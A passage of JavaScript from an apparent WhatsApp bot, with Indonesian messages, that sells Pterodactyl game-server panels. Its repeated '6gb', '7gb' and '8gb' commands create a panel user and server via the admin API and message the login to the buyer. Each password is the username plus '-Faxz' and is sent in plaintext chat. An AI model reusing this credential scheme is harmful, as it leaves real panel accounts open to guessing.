const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "6050"
let cpu = "180"
let disk = "6050"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "7050"
let cpu = "210"
let disk = "7050"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "8050"
let cpu = "240"
let disk = "8050"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

